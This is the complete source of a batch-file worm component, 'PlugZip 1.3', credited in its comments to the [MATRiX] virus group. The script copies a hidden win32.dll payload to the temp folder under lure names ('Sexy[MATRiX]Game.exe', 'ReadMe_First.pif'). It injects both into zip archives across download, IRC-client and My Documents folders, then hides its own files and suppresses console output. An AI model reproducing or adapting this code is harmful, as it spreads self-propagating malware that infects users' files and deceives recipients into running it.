::PK   
@ECHO OFF
ctty nul
attrib -h %windir%\win32.dll
if not exist %windir%\win32.dll goto :n0
copy /B %windir%\win32.dll %tmp%\Sexy[MATRiX]Game.exe /Y
copy /B %windir%\win32.dll %tmp%\ReadMe_First.pif /Y
if not exist c:\pkzip.exe goto :n0
::PK   
for %%i in (c:\*.zip c:\mirc\*.zip c:\mirc\download\*.zip c:\pirch98\downlo~1\*.zip c:\pirch98\*.zip c:\unzipped\*.zip c:\download\*.zip c:\downlo~1\*.zip c:\Mydocu~1\*.zip c:\Mesdoc~1\*.zip c:\MEUSDO~1\*.zip %windir%\bureau\*.zip %windir%\desktop\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\Sexy[MATRiX]Game.exe > nul
for %%i in (c:\*.zip c:\mirc\*.zip c:\mirc\download\*.zip c:\pirch98\downlo~1\*.zip c:\pirch98\*.zip c:\unzipped\*.zip c:\download\*.zip c:\downlo~1\*.zip c:\Mydocu~1\*.zip c:\Mesdoc~1\*.zip c:\MEUSDO~1\*.zip %windir%\bureau\*.zip %windir%\desktop\*.zip) DO c:\pkzip -e0 -u -r -k %%i %tmp%\ReadMe_First.pif > nul
::PK   
attrib +h c:\pkzip.exe
attrib +h c:\plugzip.bat
attrib +h %windir%\win32.dll
:n0
ctty con
exit|cls
::PK   
::_[MATRiX]_PlugZip1.3__V.W.T._Zip-PlugIn___Y2K-VirWormTroj__:)
::Software provided by [MATRiX] team:
:: Ultras, Mort, Nbk, Tgr, Del_Armg0
::Greetz:
:: Vecna 4 source codes and ideas
::PK   